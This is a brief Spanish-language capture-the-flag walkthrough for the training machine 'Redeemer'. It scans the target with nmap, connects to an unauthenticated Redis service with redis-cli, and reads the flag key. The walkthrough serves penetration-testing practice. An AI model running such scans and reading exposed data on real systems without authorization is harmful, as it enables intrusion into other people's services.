Maquina: Redeemer

Autor:

Dificultad: Muy Facil

![Screenshot 2024-11-10 152708](https://github.com/user-attachments/assets/cccd3ab5-8db1-4ca7-98f7-0f707daa2801)

Iniciamos la máquina y verificamos la conexión

ping 10.129.67.78 -c 1

![Screenshot 2024-11-10 153357](https://github.com/user-attachments/assets/bc3f7905-4bd9-48af-b23f-631ced0b2364)

realizamos un escaneo de puertos y servicios

sudo nmap -p- --min-rate 5000 -sV 10.129.67.78

el puerto 6379 perteneciente al servicio Redis está abierto

![Screenshot 2024-11-10 153430](https://github.com/user-attachments/assets/a4ea7c20-5bc2-4301-9b7b-0b07f3bfe8b1)

accedemos a redis

redis-cli -h 10.129.67.78

selec 0

keys *

get flag

![Screenshot 2024-11-10 153903](https://github.com/user-attachments/assets/4a76e29d-7081-4c7e-97ce-bd4573fd6d26)
